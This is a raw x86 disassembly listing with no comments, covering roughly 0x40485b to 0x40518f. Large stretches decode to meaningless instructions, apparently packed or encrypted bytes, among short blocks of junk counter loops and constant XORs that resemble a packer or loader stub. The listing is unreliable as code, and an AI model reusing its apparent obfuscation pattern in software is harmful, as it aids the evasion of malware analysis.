  40485b:	xchg   ebx,eax
  40485c:	fdivr  DWORD PTR [esi]
  40485e:	jle    0x40485c
  404860:	push   ebx
  404861:	retf   0xcca6
  404864:	pop    ebp
  404865:	pop    esi
  404866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404867:	adc    edi,edx
  404869:	into   
  40486a:	scas   eax,DWORD PTR es:[edi]
  40486b:	inc    ebx
  40486c:	sbb    BYTE PTR [ecx-0x1e6cbdb8],0x1a
  404873:	dec    edx
  404874:	inc    edi
  404875:	and    DWORD PTR [edx+edi*1],ecx
  404878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404879:	nop
  40487a:	add    bl,BYTE PTR [ebx-0x10]
  40487d:	clc    
  40487e:	mov    edi,0x4403a01a
  404883:	ins    DWORD PTR es:[edi],dx
  404884:	cwde   
  404885:	sahf   
  404886:	icebp  
  404887:	in     al,0x49
  404889:	dec    esi
  40488a:	clc    
  40488b:	shr    DWORD PTR [ebp+0x1cf3ee8d],0x65
  404892:	cmc    
  404893:	mov    ebp,?
  404895:	sbb    eax,0x39d746e5
  40489a:	pop    eax
  40489b:	arpl   WORD PTR [esi+ecx*4],cx
  40489e:	out    0x8f,eax
  4048a0:	aas    
  4048a1:	jp     0x404856
  4048a3:	in     al,0x4e
  4048a5:	outs   dx,BYTE PTR ds:[esi]
  4048a6:	test   al,0x21
  4048a8:	and    BYTE PTR [edi-0x7749749],bh
  4048ae:	push   ebp
  4048af:	pop    ss
  4048b0:	out    0x6a,eax
  4048b2:	lock xchg ebx,eax
  4048b4:	(bad)  
  4048b5:	dec    esp
  4048b6:	xlat   BYTE PTR ds:[ebx]
  4048b7:	nop
  4048b8:	ret    0xc6cf
  4048bb:	or     DWORD PTR [eax+0x15],edi
  4048be:	mov    eax,0xb9656925
  4048c3:	fneni(8087 only) 
  4048c5:	jae    0x404881
  4048c7:	stos   DWORD PTR es:[edi],eax
  4048c8:	jecxz  0x404948
  4048ca:	push   eax
  4048cb:	fidiv  WORD PTR [ebp+0x7d]
  4048ce:	pop    edx
  4048cf:	in     al,0xa1
  4048d1:	and    DWORD PTR [edi+eax*4+0x4b],esi
  4048d5:	and    DWORD PTR [ecx-0x7fcd2048],esp
  4048db:	xchg   ebp,eax
  4048dc:	add    dl,BYTE PTR [eax]
  4048de:	cmc    
  4048df:	mov    bl,0x3e
  4048e1:	aas    
  4048e2:	fs jae 0x404899
  4048e5:	pop    edx
  4048e6:	jae    0x40488c
  4048e8:	in     eax,0x9f
  4048ea:	mov    edx,0x89bfdc8e
  4048ef:	jl     0x404957
  4048f1:	das    
  4048f2:	ja     0x4048ba
  4048f4:	ds mov edi,0xe93ea94
  4048fa:	js     0x4048e1
  4048fc:	cmp    al,0x52
  4048fe:	mov    al,0x90
  404900:	int    0x66
  404902:	std    
  404903:	cdq    
  404904:	adc    BYTE PTR [esp+edi*8-0x76],dl
  404908:	xchg   ebx,eax
  404909:	jns    0x404928
  40490b:	fldenv [ebx+0x6a]
  40490e:	(bad)  
  40490f:	xor    eax,0xebbd807b
  404914:	mov    WORD PTR [ebp-0x5f],ds
  404917:	pop    ecx
  404918:	sbb    esp,DWORD PTR [eax+0x45]
  40491b:	mov    ebp,edi
  40491d:	jmp    0x4aaa:0xb60665e
  404924:	frstor [edx-0x28]
  404927:	clc    
  404928:	mov    eax,edx
  40492a:	in     al,0x88
  40492c:	jns    0x404913
  40492e:	push   ss
  40492f:	and    eax,0x18a6a191
  404934:	mov    bh,0x7f
  404936:	ins    DWORD PTR es:[edi],dx
  404937:	fwait
  404938:	adc    al,0x1c
  40493a:	dec    eax
  40493b:	jecxz  0x40499d
  40493d:	stos   DWORD PTR es:[edi],eax
  40493e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40493f:	(bad)  
  404940:	fst    DWORD PTR [ecx]
  404942:	cs imul ebp,ecx,0x66fb455f
  404949:	outs   dx,DWORD PTR ds:[esi]
  40494a:	sbb    BYTE PTR [ebp+0x1544ce1b],al
  404950:	lods   al,BYTE PTR ds:[esi]
  404951:	cmp    BYTE PTR [esp+esi*2+0x64ef6d1b],ah
  404958:	xor    al,0x44
  40495a:	aaa    
  40495b:	jp     0x4048e1
  40495d:	cdq    
  40495e:	jmp    0x8ba4763e
  404963:	loopne 0x404970
  404965:	inc    ecx
  404966:	mov    edx,0x846fb492
  40496b:	add    BYTE PTR gs:[edx+eax*1-0x6c],dh
  404970:	pop    esi
  404971:	ret    
  404972:	sbb    eax,0x6b4996b8
  404977:	ss jne 0x40498b
  40497a:	sub    eax,0x9b1c7f7c
  40497f:	jae    0x404913
  404981:	lods   eax,DWORD PTR ds:[esi]
  404982:	add    DWORD PTR [eax-0x50],ebp
  404985:	adc    edx,DWORD PTR [edx+edx*2+0x4b]
  404989:	mov    ecx,0xe37ef776
  40498e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40498f:	add    eax,0x141ef847
  404994:	pop    esp
  404995:	icebp  
  404996:	mov    esi,0x167995ca
  40499b:	sti    
  40499c:	mov    dl,0xe8
  40499e:	leave  
  40499f:	mov    al,ds:0x98877467
  4049a4:	cwde   
  4049a5:	sbb    BYTE PTR [ebx+0x7a],ah
  4049a8:	xchg   edx,eax
  4049a9:	(bad)  
  4049aa:	fisub  DWORD PTR [esi+0x71]
  4049ad:	dec    ecx
  4049ae:	cmp    al,0x19
  4049b0:	jno    0x404a30
  4049b2:	leave  
  4049b3:	jge    0x4049f5
  4049b5:	jecxz  0x4049da
  4049b7:	xchg   esp,eax
  4049b8:	push   ecx
  4049b9:	test   eax,0x4ee5ab63
  4049be:	pop    edi
  4049bf:	jmp    0x404972
  4049c1:	pushf  
  4049c2:	popa   
  4049c3:	mov    ch,0x4b
  4049c5:	pop    ebx
  4049c6:	jmp    0xd314a53f
  4049cb:	or     BYTE PTR [ebp+0x4c],cl
  4049ce:	jbe    0x4049d8
  4049d0:	mov    ecx,0xa6aba2f3
  4049d5:	es enter 0xf9bc,0x6b
  4049da:	push   0x38
  4049dc:	add    eax,0xfb1516c
  4049e1:	pop    ss
  4049e2:	fsubr  QWORD PTR [eax-0x36e4c024]
  4049e8:	xor    ebp,DWORD PTR gs:0xc7218603
  4049ef:	ret    0x8e4c
  4049f2:	ficom  WORD PTR [eax+0x6a94361c]
  4049f8:	imul   esp,DWORD PTR [esi],0x2f
  4049fb:	lds    edi,FWORD PTR es:[ebx+0x76]
  4049ff:	jl     0x404984
  404a01:	jmp    0x7a1036d6
  404a06:	out    dx,al
  404a07:	sub    eax,0x4e640fc1
  404a0c:	mov    ss,ebx
  404a0e:	jno    0x404995
  404a10:	adc    eax,0x8d91c063
  404a15:	jb     0x404a25
  404a17:	mov    ebx,0x2cfeb5e2
  404a1c:	jl     0x404a02
  404a1e:	mov    dh,0xa7
  404a20:	sub    dh,dl
  404a22:	aas    
  404a23:	add    BYTE PTR [edx-0xf],dl
  404a26:	popa   
  404a27:	pop    ds
  404a28:	sub    BYTE PTR [edx-0x2dde8fd6],dl
  404a2e:	xor    DWORD PTR [edx+ebx*2-0x21],esi
  404a32:	out    dx,al
  404a33:	cs (bad) 
  404a35:	std    
  404a36:	jge    0x4049c6
  404a38:	jb     0x404a1c
  404a3a:	bound  ebx,QWORD PTR [eax+edi*2-0x6b]
  404a3e:	jo     0x4049d0
  404a40:	data16 (bad) 
  404a42:	hlt    
  404a43:	sub    eax,0x5ea5bc59
  404a48:	cmp    dl,bl
  404a4a:	push   edi
  404a4b:	clc    
  404a4c:	aas    
  404a4d:	jne    0x404a6b
  404a4f:	iret   
  404a50:	sub    ah,BYTE PTR [edx]
  404a52:	js     0x404ac6
  404a54:	outs   dx,DWORD PTR ds:[esi]
  404a55:	mov    esp,0xe4842bf2
  404a5a:	aad    0x51
  404a5c:	lahf   
  404a5d:	(bad)  
  404a5e:	dec    BYTE PTR [ecx+0x42b85d3]
  404a64:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  404a66:	mov    BYTE PTR [bx],al
  404a69:	pop    ss
  404a6a:	call   0x5e5f:0x33e25d54
  404a71:	pop    ebx
  404a72:	leave  
  404a73:	ret    
  404a74:	push   ebp
  404a75:	mov    ebp,esp
  404a77:	sub    esp,0x2c
  404a7a:	leave  
  404a7b:	ret    0x10
  404a7e:	push   ebp
  404a7f:	mov    ebp,esp
  404a81:	sub    esp,0x44
  404a84:	adc    DWORD PTR ds:0x43383f,edi
  404a8a:	push   edi
  404a8b:	mov    eax,DWORD PTR [ebp+0xc]
  404a8e:	mov    edx,DWORD PTR ds:0x4337b7
  404a94:	and    DWORD PTR ds:0x433803,edx
  404a9a:	mov    DWORD PTR [ebp-0x10],eax
  404a9d:	adc    DWORD PTR ds:0x43372b,0x2679
  404aa7:	mov    eax,DWORD PTR [ebp+0x8]
  404aaa:	xor    ecx,DWORD PTR ds:0x43376b
  404ab0:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  404ab7:	mov    DWORD PTR ds:0x43382b,0x7030
  404ac1:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  404ac8:	and    DWORD PTR ds:0x4337c3,0x0
  404ad2:	mov    edi,DWORD PTR ds:0x4337c3
  404ad8:	inc    edi
  404ad9:	mov    DWORD PTR ds:0x4337c3,edi
  404adf:	cmp    DWORD PTR ds:0x4337c3,0x6
  404ae6:	jne    0x404af5
  404aec:	push   DWORD PTR [ebp-0x18]
  404aef:	call   DWORD PTR ds:0x412358
  404af5:	cmp    DWORD PTR ds:0x4337c3,0x5
  404afc:	jne    0x404b0f
  404b02:	mov    edi,DWORD PTR ds:0x4337c3
  404b08:	inc    edi
  404b09:	mov    DWORD PTR ds:0x4337c3,edi
  404b0f:	cmp    DWORD PTR ds:0x4337c3,0x14
  404b16:	jb     0x404ad2
  404b1c:	jmp    0x404e76
  404b21:	push   ecx
  404b22:	mov    esi,0xf1913591
  404b27:	jno    0x404b83
  404b29:	ins    DWORD PTR es:[edi],dx
  404b2a:	inc    ebp
  404b2b:	fild   WORD PTR [ecx+0x37793098]
  404b31:	xor    ebp,DWORD PTR ds:0x7d337e7e
  404b37:	jle    0x404bb7
  404b39:	adc    edx,DWORD PTR [ecx-0x79]
  404b3c:	cmp    al,0x3f
  404b3e:	xchg   ecx,eax
  404b3f:	popa   
  404b40:	test   DWORD PTR [ecx],0xb4041f11
  404b46:	into   
  404b47:	inc    esp
  404b48:	retf   0xcf81
  404b4b:	push   edi
  404b4c:	and    eax,0x6d610b73
  404b51:	adc    DWORD PTR [eax-0x42855b93],0x22
  404b58:	ja     0x404bb6
  404b5a:	mov    al,ds:0x81105a99
  404b5f:	push   ebx
  404b60:	sbb    ecx,DWORD PTR [edx+ebx*8+0x3fa8070d]
  404b67:	mov    edi,0xe7e4f1e5
  404b6c:	or     ebp,eax
  404b6e:	repnz sub al,0x4
  404b71:	test   al,0x5f
  404b73:	sbb    esi,esp
  404b75:	xor    esp,DWORD PTR [ebx]
  404b77:	jne    0x404b83
  404b79:	icebp  
  404b7a:	ins    DWORD PTR es:[edi],dx
  404b7b:	cmovle edx,DWORD PTR [ecx-0x3a]
  404b7f:	xlat   BYTE PTR ds:[ebx]
  404b80:	or     BYTE PTR [ebx+0x3e1bd6a2],bl
  404b86:	pushf  
  404b87:	out    dx,al
  404b88:	push   esi
  404b89:	mov    esi,0x5ea294a4
  404b8e:	mov    eax,ds:0xd562cf7b
  404b93:	cmp    BYTE PTR [ecx],cl
  404b95:	lahf   
  404b96:	jno    0x404b69
  404b98:	mov    edi,0x3bd14edd
  404b9d:	pop    edi
  404b9e:	inc    edx
  404b9f:	mov    ebp,0x2ac87d04
  404ba4:	dec    esp
  404ba5:	sub    BYTE PTR [edx-0x17],dh
  404ba8:	neg    BYTE PTR [esi+esi*8+0x73dc9e9b]
  404baf:	or     ah,BYTE PTR [edi+0x31]
  404bb2:	sub    eax,0x764f033c
  404bb7:	enter  0x164c,0x29
  404bbb:	test   eax,0x2ace8274
  404bc0:	(bad)  
  404bc1:	outs   dx,BYTE PTR ds:[esi]
  404bc2:	sub    eax,0x16ff6b32
  404bc7:	repz dec eax
  404bc9:	mov    eax,ds:0x375db27a
  404bce:	inc    edx
  404bcf:	lock int3 
  404bd1:	lock jmp 0x52a0667f
  404bd7:	test   DWORD PTR [esi+edx*8-0x729dbd5f],eax
  404bde:	adc    eax,DWORD PTR [ecx+eiz*8]
  404be1:	jl     0x404b72
  404be3:	cmc    
  404be4:	inc    esi
  404be5:	inc    esi
  404be6:	mov    dl,0x34
  404be8:	sub    eax,0x14c8cfde
  404bed:	mov    DWORD PTR [esi+0x6c],ebp
  404bf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bf1:	cdq    
  404bf2:	pop    ss
  404bf3:	push   edx
  404bf4:	icebp  
  404bf5:	add    bh,bl
  404bf7:	std    
  404bf8:	aam    0x50
  404bfa:	add    al,0x38
  404bfc:	popa   
  404bfd:	ins    DWORD PTR es:[edi],dx
  404bfe:	add    eax,0xa0973ef
  404c03:	aas    
  404c04:	push   ecx
  404c05:	ror    ebp,cl
  404c07:	outs   dx,BYTE PTR ds:[esi]
  404c08:	dec    eax
  404c09:	add    eax,0x79ecdea5
  404c0e:	retf   
  404c0f:	jb     0x404c76
  404c11:	xchg   BYTE PTR [esi+0x67],dh
  404c14:	sub    eax,0x87237e7c
  404c19:	jo     0x404c78
  404c1b:	ds aaa 
  404c1d:	adc    ebx,DWORD PTR [edi]
  404c1f:	mov    DWORD PTR [ebx],edi
  404c21:	and    dl,dl
  404c23:	clc    
  404c24:	cld    
  404c25:	adc    ch,bl
  404c27:	pop    edx
  404c28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c29:	mov    BYTE PTR [esi+0x1a],al
  404c2c:	adc    DWORD PTR [ecx+0x589d72ed],0x415bb6c0
  404c36:	ret    0x2593
  404c39:	cmp    al,0x55
  404c3b:	jns    0x404c2c
  404c3d:	inc    ebx
  404c3e:	xchg   edx,eax
  404c3f:	mov    esi,0x4d5f476f
  404c44:	enter  0x573,0xc2
  404c48:	stos   BYTE PTR es:[edi],al
  404c49:	retf   
  404c4a:	sub    ch,al
  404c4c:	xlat   BYTE PTR ds:[ebx]
  404c4d:	jp     0x404bf0
  404c4f:	push   ss
  404c50:	pop    ecx
  404c51:	jno    0x404caa
  404c53:	inc    edx
  404c54:	xchg   edx,eax
  404c55:	or     BYTE PTR [edx],cl
  404c57:	enter  0x9f5a,0xbd
  404c5b:	xchg   DWORD PTR [esi+0x16],esi
  404c5e:	jp     0x404c10
  404c60:	lea    ecx,[esi+eiz*4]
  404c63:	retf   
  404c64:	dec    edx
  404c65:	test   eax,0x22b1c68f
  404c6a:	jl     0x404c63
  404c6c:	icebp  
  404c6d:	or     edx,DWORD PTR [edi+ebx*2-0x301d2e58]
  404c74:	inc    esi
  404c75:	xchg   ebx,eax
  404c76:	cdq    
  404c77:	out    dx,al
  404c78:	cmp    al,0x86
  404c7a:	test   DWORD PTR [eax+0x6eb8a4e2],ebp
  404c80:	aam    0xcc
  404c82:	dec    ebp
  404c83:	mov    ds:0x24bb864b,al
  404c88:	rcr    dl,1
  404c8a:	inc    eax
  404c8b:	cmp    cl,cl
  404c8d:	xor    al,0xae
  404c8f:	sbb    bh,BYTE PTR [esp+eiz*8]
  404c92:	inc    eax
  404c93:	mov    ecx,0x545a983f
  404c98:	aas    
  404c99:	rcr    BYTE PTR [eax-0x70d3fb5f],cl
  404c9f:	ds push edi
  404ca1:	fldcw  WORD PTR [ebx-0x1dfcac1b]
  404ca7:	push   ebp
  404ca8:	and    BYTE PTR [eax+0x67],bl
  404cab:	jle    0x404c7b
  404cad:	ror    bl,1
  404caf:	push   edx
  404cb0:	add    DWORD PTR [edx+0x59160b39],ecx
  404cb6:	xchg   esi,eax
  404cb7:	nop
  404cb8:	cdq    
  404cb9:	sub    DWORD PTR [edi],0xc0e202b2
  404cbf:	push   ss
  404cc0:	mov    ah,0x5f
  404cc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cc3:	retf   0x87e
  404cc6:	aas    
  404cc7:	xchg   edi,eax
  404cc8:	icebp  
  404cc9:	out    dx,al
  404cca:	mov    DWORD PTR [edi-0x41805929],ebx
  404cd0:	jmp    0x54ecef23
  404cd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cd6:	add    DWORD PTR [edx+eax*1+0x69],edi
  404cda:	jge    0x404cbe
  404cdc:	lods   al,BYTE PTR ds:[esi]
  404cdd:	in     al,0xfb
  404cdf:	clc    
  404ce0:	mov    ah,0xfd
  404ce2:	enter  0x77ce,0x8a
  404ce6:	outs   dx,BYTE PTR ds:[esi]
  404ce7:	jp     0x404c7e
  404ce9:	pop    ss
  404cea:	jmp    0x277c:0x96d9b951
  404cf1:	xor    BYTE PTR [esi-0x40],0x88
  404cf5:	popf   
  404cf6:	out    0xac,al
  404cf8:	ret    0x8930
  404cfb:	jno    0x404cc4
  404cfd:	and    edi,DWORD PTR [edi-0x80]
  404d00:	pop    es
  404d01:	fsubr  DWORD PTR [eax]
  404d03:	adc    BYTE PTR [esi],al
  404d05:	mov    ebp,0x344fd462
  404d0a:	lock lock and dl,BYTE PTR [eax]
  404d0e:	cmp    DWORD PTR [ebx],0xf54ad451
  404d14:	(bad)  
  404d15:	sbb    eax,0x34d1de06
  404d1a:	xchg   edi,eax
  404d1b:	sar    BYTE PTR [eax+0x8],cl
  404d1e:	fadd   DWORD PTR [edi+0x3684ca03]
  404d24:	cs das 
  404d26:	xchg   esi,eax
  404d27:	jb     0x404d72
  404d29:	pop    ds
  404d2a:	dec    ebp
  404d2b:	test   esp,ebx
  404d2d:	push   ebp
  404d2e:	cmp    DWORD PTR es:[edx+0x4c],0x4
  404d33:	bnd jo 0x404da2
  404d36:	test   esp,0x975f9dd6
  404d3c:	or     eax,DWORD PTR [ebx+0x26]
  404d3f:	fimul  WORD PTR ds:0xc8d01f42
  404d45:	and    eax,0xd1f312e9
  404d4a:	rol    BYTE PTR [ebp-0x5],0x16
  404d4e:	add    BYTE PTR [edx],bl
  404d50:	daa    
  404d51:	sub    bl,BYTE PTR ds:0x6b7bffbb
  404d57:	leave  
  404d58:	mov    bh,0xd4
  404d5a:	cmp    eax,0x7bf17e8
  404d5f:	or     al,0xac
  404d61:	pop    eax
  404d62:	mov    edx,0x215548ca
  404d67:	mov    eax,0xa283f5a5
  404d6c:	inc    eax
  404d6d:	jbe    0x404de6
  404d6f:	jp     0x404dc6
  404d71:	int3   
  404d72:	stos   BYTE PTR es:[edi],al
  404d73:	arpl   WORD PTR [ebx+edi*2],dx
  404d76:	mov    edx,0x3e9a778b
  404d7b:	push   esp
  404d7c:	clc    
  404d7d:	sub    BYTE PTR [ebp+0x16],bh
  404d80:	sub    esp,DWORD PTR [ebx-0xa294fbb]
  404d86:	test   BYTE PTR [ebp+0x72a90f7],0xed
  404d8d:	push   esi
  404d8e:	imul   esp,DWORD PTR [esi-0x57cc27d3],0xd572f0fe
  404d98:	pop    ds
  404d99:	xchg   ecx,eax
  404d9a:	stos   DWORD PTR es:[edi],eax
  404d9b:	pusha  
  404d9c:	sbb    BYTE PTR [ebx-0x53a2eb3c],al
  404da2:	xchg   BYTE PTR [esi-0x6b],bh
  404da5:	addr16 xchg ecx,eax
  404da7:	jo     0x404d65
  404da9:	sub    DWORD PTR [ecx],ebp
  404dab:	dec    DWORD PTR [esi+0x1c]
  404dae:	test   BYTE PTR [eax+ebp*1+0x69],0x77
  404db3:	data16 repz sahf 
  404db6:	imul   edi,DWORD PTR [ebx+ebp*1],0xffffffcf
  404dba:	loop   0x404d57
  404dbc:	mov    eax,ds:0x440252f
  404dc1:	inc    BYTE PTR [eax-0x740dcf6d]
  404dc7:	add    BYTE PTR [esi+edi*2],0x60
  404dcb:	jp     0x404da0
  404dcd:	push   ds
  404dce:	imul   ebx,DWORD PTR [eax-0x7a1d26df],0x6f8cb084
  404dd8:	and    edi,DWORD PTR [edx+0x71]
  404ddb:	bound  ecx,QWORD PTR [ebp-0x7c]
  404dde:	scas   al,BYTE PTR es:[edi]
  404ddf:	fdiv   DWORD PTR [ecx]
  404de1:	mov    edi,0xfb8f23e1
  404de6:	xor    BYTE PTR [ebp+0x46],dl
  404de9:	hlt    
  404dea:	bound  ebx,QWORD PTR [ebp+0x6646d3e3]
  404df0:	mov    al,BYTE PTR [esi+0x44]
  404df3:	popa   
  404df4:	sbb    ebx,DWORD PTR [edi]
  404df6:	lods   eax,DWORD PTR ds:[esi]
  404df7:	xor    ebx,0x2f
  404dfa:	sbb    al,0xbb
  404dfc:	loope  0x404dbd
  404dfe:	rcr    BYTE PTR [eax+edi*2+0x6],cl
  404e02:	mul    BYTE PTR [ecx+esi*2]
  404e05:	xlat   BYTE PTR ds:[ebx]
  404e06:	inc    ecx
  404e07:	jbe    0x404d8d
  404e09:	and    eax,0xdd717a12
  404e0e:	pop    edi
  404e0f:	ficomp WORD PTR [ebx]
  404e11:	push   esi
  404e12:	xchg   edx,eax
  404e13:	ins    BYTE PTR es:[edi],dx
  404e14:	into   
  404e15:	mov    dh,0xef
  404e17:	cmp    ebx,DWORD PTR [ebp+0x54d89014]
  404e1d:	xor    bh,BYTE PTR [edi-0x14]
  404e20:	lods   al,BYTE PTR ds:[esi]
  404e21:	repnz pop es
  404e23:	ins    DWORD PTR es:[edi],dx
  404e24:	in     eax,0x8c
  404e26:	add    BYTE PTR [ebx-0x2fa0b6c7],bh
  404e2c:	mul    BYTE PTR [ebx-0x2799fcae]
  404e32:	mov    al,ds:0xb339a822
  404e37:	imul   esi,DWORD PTR [eax-0x48a491f2],0x14e5c992
  404e41:	stc    
  404e42:	mov    ebx,0xaa058277
  404e47:	das    
  404e48:	(bad)  
  404e49:	pop    ss
  404e4a:	jge    0x404df0
  404e4c:	inc    ecx
  404e4d:	retf   
  404e4e:	cmp    al,0x8
  404e51:	push   eax
  404e52:	outs   dx,BYTE PTR ds:[esi]
  404e53:	mov    ecx,0xf43bcf65
  404e58:	inc    ebp
  404e59:	pop    ebp
  404e5a:	inc    esp
  404e5b:	jmp    0x404e5a
  404e5d:	fucom  st(5)
  404e5f:	add    eax,0x3009558a
  404e64:	fldcw  WORD PTR [eax+edx*2+0x4620bbc1]
  404e6b:	lock jle 0x404eea
  404e6e:	ror    BYTE PTR [ecx-0xbdcb8d5],cl
  404e74:	test   DWORD PTR [eax-0x7ef7aa75],ecx
  404e7a:	rcr    DWORD PTR [ecx+0x73],1
  404e7d:	add    BYTE PTR [eax],al
  404e7f:	mov    DWORD PTR [ebp-0x40],eax
  404e82:	mov    eax,0x7510854
  404e87:	xor    edx,eax
  404e89:	adc    DWORD PTR ds:0x43371b,0x3221
  404e93:	mov    ecx,0x32729b
  404e98:	mov    edi,DWORD PTR ds:0x4337e7
  404e9e:	adc    DWORD PTR ds:0x43377f,edi
  404ea4:	add    edx,ecx
  404ea6:	neg    edi
  404ea8:	mov    DWORD PTR [ebp-0x8],edx
  404eab:	mov    DWORD PTR ds:0x4337eb,0x10
  404eb5:	cmp    DWORD PTR ds:0x4337eb,0x0
  404ebc:	je     0x404f14
  404ec2:	cmp    DWORD PTR ds:0x4337eb,0x9
  404ec9:	jne    0x404ee2
  404ecf:	push   0x6f04
  404ed4:	push   0x5d47
  404ed9:	push   DWORD PTR [ebp-0x1c]
  404edc:	call   DWORD PTR ds:0x41235c
  404ee2:	cmp    DWORD PTR ds:0x4337eb,0xa
  404ee9:	jne    0x404efc
  404eef:	mov    edi,DWORD PTR ds:0x4337eb
  404ef5:	dec    edi
  404ef6:	mov    DWORD PTR ds:0x4337eb,edi
  404efc:	mov    edi,DWORD PTR ds:0x4337eb
  404f02:	dec    edi
  404f03:	mov    DWORD PTR ds:0x4337eb,edi
  404f09:	jmp    0x404eb5
  404f0e:	and    DWORD PTR ds:0x43383f,ecx
  404f14:	mov    edx,DWORD PTR [ebp+0x8]
  404f17:	sbb    edi,DWORD PTR ds:0x4337eb
  404f1d:	xor    edx,eax
  404f1f:	sbb    edi,DWORD PTR ds:0x4337bf
  404f25:	add    edx,ecx
  404f27:	and    DWORD PTR ds:0x43383b,0x0
  404f31:	xor    edi,edi
  404f33:	add    edi,DWORD PTR ds:0x43383b
  404f39:	inc    edi
  404f3a:	mov    DWORD PTR ds:0x43383b,edi
  404f40:	cmp    DWORD PTR ds:0x43383b,0xc
  404f47:	jne    0x404f58
  404f4d:	push   0x3fd8
  404f52:	call   DWORD PTR ds:0x412000
  404f58:	cmp    DWORD PTR ds:0x43383b,0xb
  404f5f:	jne    0x404f72
  404f65:	mov    edi,DWORD PTR ds:0x43383b
  404f6b:	inc    edi
  404f6c:	mov    DWORD PTR ds:0x43383b,edi
  404f72:	cmp    DWORD PTR ds:0x43383b,0x17
  404f79:	jb     0x404f31
  404f7f:	mov    DWORD PTR [ebp+0xc],edx
  404f82:	mov    DWORD PTR ds:0x433737,0x5f27
  404f8c:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  404f93:	xor    DWORD PTR ds:0x433767,edi
  404f99:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  404fa0:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  404fa7:	sbb    DWORD PTR ds:0x4337ef,edi
  404fad:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  404fb4:	adc    DWORD PTR ds:0x43370f,ecx
  404fba:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  404fc1:	movzx  edi,WORD PTR ds:0x433767
  404fc8:	and    DWORD PTR ds:0x433713,edi
  404fce:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  404fd5:	dec    edx
  404fd6:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  404fdd:	mov    edx,DWORD PTR [ebp+0x8]
  404fe0:	add    DWORD PTR ds:0x4337e7,ebx
  404fe6:	xor    edx,eax
  404fe8:	add    edi,0x469e
  404fee:	mov    edi,DWORD PTR [ebp-0x10]
  404ff1:	add    edx,ecx
  404ff3:	cmp    edi,edx
  404ff5:	mov    DWORD PTR ds:0x43382f,0x53a
  404fff:	je     0x40685f
  405005:	mov    DWORD PTR ds:0x433837,0x2c13
  40500f:	push   ebx
  405010:	mov    DWORD PTR ds:0x4337ef,0x2429
  40501a:	jmp    0x40683a
  40501f:	mov    edx,DWORD PTR [ebp-0x8]
  405022:	and    DWORD PTR ds:0x433727,0x0
  40502c:	mov    edi,DWORD PTR ds:0x433727
  405032:	inc    edi
  405033:	mov    DWORD PTR ds:0x433727,edi
  405039:	cmp    DWORD PTR ds:0x433727,0x6
  405040:	jne    0x40505d
  405046:	push   DWORD PTR [ebp-0x14]
  405049:	push   DWORD PTR [ebp-0x10]
  40504c:	push   DWORD PTR [ebp-0xc]
  40504f:	push   DWORD PTR [ebp-0x18]
  405052:	push   0x82f7
  405057:	call   DWORD PTR ds:0x41236c
  40505d:	cmp    DWORD PTR ds:0x433727,0x5
  405064:	jne    0x405079
  40506a:	xor    edi,edi
  40506c:	xor    edi,DWORD PTR ds:0x433727
  405072:	inc    edi
  405073:	mov    DWORD PTR ds:0x433727,edi
  405079:	cmp    DWORD PTR ds:0x433727,0x17
  405080:	jb     0x40502c
  405086:	xor    edi,edi
  405088:	add    edi,DWORD PTR ds:0x4337ff
  40508e:	add    DWORD PTR ds:0x4337bb,edi
  405094:	mov    edi,DWORD PTR [ebp-0x10]
  405097:	sub    edi,edx
  405099:	mov    edx,DWORD PTR [ebp-0x4]
  40509c:	xor    edx,eax
  40509e:	add    edx,ecx
  4050a0:	mov    DWORD PTR ds:0x4337eb,0x78fa
  4050aa:	cmp    edi,edx
  4050ac:	mov    DWORD PTR ds:0x43383b,0x49ec
  4050b6:	jb     0x40685e
  4050bc:	mov    edx,DWORD PTR [ebp-0x28]
  4050bf:	mov    edi,DWORD PTR [ebp-0x4]
  4050c2:	xor    edx,eax
  4050c4:	inc    DWORD PTR ds:0x43383b
  4050ca:	xor    edi,eax
  4050cc:	not    DWORD PTR ds:0x4337fb
  4050d2:	add    edi,ecx
  4050d4:	add    edx,ecx
  4050d6:	adc    ebx,0x69d8
  4050dc:	imul   edx,edi
  4050df:	mov    edi,DWORD PTR [ebp-0x8]
  4050e2:	mov    ebx,DWORD PTR [ebp-0x10]
  4050e5:	sbb    DWORD PTR ds:0x433727,0x4337b7
  4050ef:	sub    ebx,edi
  4050f1:	mov    DWORD PTR ds:0x43371f,0x4726
  4050fb:	cmp    ebx,edx
  4050fd:	mov    DWORD PTR ds:0x4337eb,0x2e42
  405107:	ja     0x4054d4
  40510d:	and    DWORD PTR ds:0x4337ff,0x0
  405117:	jmp    0x40512b
  40511c:	xor    edx,edx
  40511e:	add    edx,DWORD PTR ds:0x4337ff
  405124:	inc    edx
  405125:	mov    DWORD PTR ds:0x4337ff,edx
  40512b:	cmp    DWORD PTR ds:0x4337ff,0x17
  405132:	jae    0x40515a
  405138:	cmp    DWORD PTR ds:0x4337ff,0x18
  40513f:	jne    0x405155
  405145:	push   0x19d0
  40514a:	push   0x338d
  40514f:	call   DWORD PTR ds:0x412004
  405155:	jmp    0x40511c
  40515a:	mov    edx,DWORD PTR [ebp-0x4]
  40515d:	sbb    DWORD PTR ds:0x4337eb,0x43376f
  405167:	xor    edx,eax
  405169:	xor    DWORD PTR ds:0x4337e7,0x55d1
  405173:	jmp    0x4054cd
  405178:	cdq    
  405179:	jp     0x4051e8
  40517b:	pushf  
  40517c:	ins    DWORD PTR es:[edi],dx
  40517d:	imul   ebp,DWORD PTR [ecx+0x7b],0x879a2b7f
  405184:	jmp    0xf4dd0339
  405189:	sub    BYTE PTR [esi+0x7e],bh
  40518c:	xor    edi,DWORD PTR [ebp+0x7e]
  40518f:	jle    0x4051ce
